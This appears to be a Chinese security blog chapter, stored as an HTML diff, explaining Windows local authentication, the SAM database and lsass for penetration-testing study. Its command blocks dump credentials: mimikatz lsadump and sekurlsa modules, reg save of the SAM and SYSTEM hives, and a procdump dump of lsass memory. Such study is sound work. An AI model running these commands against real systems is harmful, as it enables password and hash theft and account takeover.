@@ -1,0 +1,431 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>第二章-Windows认证机制和协议 - ≧▽≦</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="≧▽≦"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="≧▽≦"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="&amp;lt;1&amp;gt; Windows认证(1) Windows认证基础windows的认证包括三个部分：  本地认证：用户直接操作计算机登录账户 网络认证：远程连接到工作组中的某个设备 域认证：登录到域环境中的某个设备  windows认证和密码的抓取可以说是内网渗透的第一步"><meta property="og:type" content="blog"><meta property="og:title" content="第二章-Windows认证机制和协议"><meta property="og:url" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/"><meta property="og:site_name" content="≧▽≦"><meta property="og:description" content="&amp;lt;1&amp;gt; Windows认证(1) Windows认证基础windows的认证包括三个部分：  本地认证：用户直接操作计算机登录账户 网络认证：远程连接到工作组中的某个设备 域认证：登录到域环境中的某个设备  windows认证和密码的抓取可以说是内网渗透的第一步"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925161844633.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230926160137492.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925181215606.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925181148045.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927092605911.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927093307265.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100145327.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100548564.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100902536.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925211741667.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925211904137.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925213249994.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925213615379.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925221821619.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927085014846.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005162943750.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005164440355.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005125646174.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005132050370.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005131735149.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005132538220.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005143750719.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005144135954.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005144317709.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005151402590.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005151813588.png"><meta property="og:image" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005154257959.png"><meta property="article:published_time" content="2023-09-25T07:56:19.000Z"><meta property="article:modified_time" content="2023-10-07T07:52:05.180Z"><meta property="article:author" content="1vxyz"><meta property="article:tag" content="内网渗透"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925161844633.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/"},"headline":"第二章-Windows认证机制和协议","image":["https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925161844633.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230926160137492.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925181215606.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925181148045.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927092605911.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927093307265.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100145327.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100548564.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100902536.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925211741667.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925211904137.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925213249994.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925213615379.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925221821619.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927085014846.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005162943750.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005164440355.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005125646174.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005132050370.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005131735149.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005132538220.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005143750719.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005144135954.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005144317709.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005151402590.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005151813588.png","https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005154257959.png"],"datePublished":"2023-09-25T07:56:19.000Z","dateModified":"2023-10-07T07:52:05.180Z","author":{"@type":"Person","name":"1vxyz"},"publisher":{"@type":"Organization","name":"≧▽≦","logo":{"@type":"ImageObject","url":"https://1vxyz.github.io/img/logo.jpg"}},"description":"&lt;1&gt; Windows认证(1) Windows认证基础windows的认证包括三个部分：  本地认证：用户直接操作计算机登录账户 网络认证：远程连接到工作组中的某个设备 域认证：登录到域环境中的某个设备  windows认证和密码的抓取可以说是内网渗透的第一步"}</script><link rel="canonical" href="https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.jpg" alt="≧▽≦" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-09-25T07:56:19.000Z" title="2023/9/25 15:56:19">2023-09-25</time>发表</span><span class="level-item"><time dateTime="2023-10-07T07:52:05.180Z" title="2023/10/7 15:52:05">2023-10-07</time>更新</span><span class="level-item">37 分钟读完 (大约5621个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">第二章-Windows认证机制和协议</h1><div class="content"><h1 id="Windows认证"><a href="#Windows认证" class="headerlink" title="&lt;1&gt; Windows认证"></a>&lt;1&gt; Windows认证</h1><h2 id="1-Windows认证基础"><a href="#1-Windows认证基础" class="headerlink" title="(1) Windows认证基础"></a>(1) Windows认证基础</h2><p>windows的认证包括三个部分：</p>
+<ul>
+<li>本地认证：用户直接操作计算机登录账户</li>
+<li>网络认证：远程连接到工作组中的某个设备</li>
+<li>域认证：登录到域环境中的某个设备</li>
+</ul>
+<p>windows认证和密码的抓取可以说是内网渗透的第一步</p>
+<span id="more"></span>
+
+<h2 id="2-windows本地认证"><a href="#2-windows本地认证" class="headerlink" title="(2) windows本地认证"></a>(2) windows本地认证</h2><p>电脑上存储着自己的账号密码，无论电脑是否联网、通外网，只要能开机，就可以输入账号密码登录到电脑中，工作组就是采用本地认证</p>
+<p>Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与 SAM文件中的密码进行对比，如果相同，则认证成功 </p>
+<p><strong>SAM文件</strong>是位于 %SystemRoot%\system32\config\ 目录下的，用于<strong>储存本地所有用户的凭证信息</strong></p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925161844633.png" alt="image-20230925161844633"></p>
+<p><strong>Windows本地认证流程</strong></p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230926160137492.png" alt="image-20230926160137492"></p>
+<p>其中：</p>
+<ul>
+<li><p><strong>Windows Logon Process（即winlogon.exe）</strong>：是Windows NT 用户登陆程序，用于管理用户登陆和退出 </p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925181215606.png" alt="image-20230925181215606"></p>
+</li>
+<li><p><strong>LSASS</strong>：一个系统进程，用于微软Windows系统的安全机制，它用于本地安全和登陆策略</p>
+</li>
+</ul>
+<p>用户注销、重启、锁屏后，操作系统会让winlogon.exe 显示开机登陆界面，接收用户的输入信息后，将密码交给lsass进程，这个过程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库进行比较认证 </p>
+<h2 id="3-SAM文件和lsass-exe进程详解"><a href="#3-SAM文件和lsass-exe进程详解" class="headerlink" title="(3) SAM文件和lsass.exe进程详解"></a>(3) SAM文件和lsass.exe进程详解</h2><p><strong>SAM文件是Windows的用户账户数据库</strong>，所有用户的登录名及口令等相关信息都会保存在这个文件里，格式如下：</p>
+<p><strong>用户名称:LM-HASH值:NTLM-HASH值</strong></p>
+<p>注：SAM文件中的密码并不是以明文的形式存在，他是加密后存储在SAM文件中</p>
+<p><strong>Lsass.exe的进程作用非常重要，它主要负责管理本地安全策略和认证机制</strong>。这些策略包括 密码策略、账户策略、用户权限、域策略等等。同时，它还负责对用户进行身份认证，以确保只有授权的用户才能访问系统资源</p>
+<ol>
+<li>将 winlogon.exe 传过来的明文账号密码进行加密，然后和SAM文件中的密文账号密码作比对。比对成功则登录成功</li>
+<li>将收到的明文账号密码在本地内存中保留一份备用 (因此可以在内存抓明文密码)</li>
+</ol>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925181148045.png" alt="image-20230925181148045"></p>
+<h2 id="4-有什么方式读取SAM文件"><a href="#4-有什么方式读取SAM文件" class="headerlink" title="(4) 有什么方式读取SAM文件"></a>(4) 有什么方式读取SAM文件</h2><ol>
+<li><p>在线读取（如果有杀软，读取工具可能会被杀，需要绕杀软）</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用mimikatz在线读</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927092605911.png" alt="image-20230927092605911"></p>
+</li>
+<li><p>离线读取（文件复制到你的电脑上，不需要绕过杀软）</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot;</span><br><span class="line"></span><br><span class="line"># nishang的<span class="built_in">copy</span>-vss进行复制  如果脚本运行在DC上，ntds.dit和SYSTEM hive也能被dump出来</span><br><span class="line"><span class="built_in">copy</span>-vss    # 文件会直接保存在当前路径下</span><br></pre></td></tr></table></figure>
+
+<p>弊端：有的文件过大，传输过程容易中断</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927093307265.png" alt="image-20230927093307265"></p>
+</li>
+</ol>
+<p>实际上，能不能离线破解出来这个明文密码都一样   拿到NTLM Hash值即可 因为Windows上的认证都是对这个值认证的，后面的 PTH 哈希传递攻击时会提到。administrator是肯定可以利用进行PTH的。</p>
+<h2 id="5-有什么方式读取lsass进程"><a href="#5-有什么方式读取lsass进程" class="headerlink" title="(5) 有什么方式读取lsass进程"></a>(5) 有什么方式读取lsass进程</h2><ul>
+<li><p>在线读取 lsass进程</p>
+<p>从 lsass进程中提取 passwords、keys、pin、tickets等信息</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">msv</span>        # 获取<span class="title">HASH</span>（<span class="title">LM</span>，<span class="title">NTLM</span>）</span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">wdigest</span>    # 通过可逆的方式去内存中读取明文密码</span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">kerberos</span>   # 如果域管理员登录了我们电脑，可以以此来获取域管的明文密码</span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">tspkg</span>      # 通过<span class="title">tspkg</span>来获取明文密码</span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">livessp</span>    # 通过<span class="title">livessp</span> 读取明文密码啊</span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">ssp</span>        # 通过<span class="title">ssp</span>读取明文密码</span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> # 通过上述各种方式读取明文密码</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100145327.png" alt="image-20230927100145327"></p>
+</li>
+<li><p>离线读取 lsass进程</p>
+<p>lsass.exe系统进程 在任务管理器中可以看到。 实际上我们可以 右键-&gt; 创建存储文件</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100548564.png" alt="image-20230927100548564"></p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927100902536.png" alt="image-20230927100902536"></p>
+<p>也可以用工具 procedump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>复制出来本地使用mimikatz 读取 lsass.dmp文件</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>上面两种方式都可以看到，读取了 NTLM的值，但是明文密码那却是 (null)</p>
+<p>为什么会这样呢？</p>
+<p>高版本弃用了LM，同时也不再往内存里写入明文密码</p>
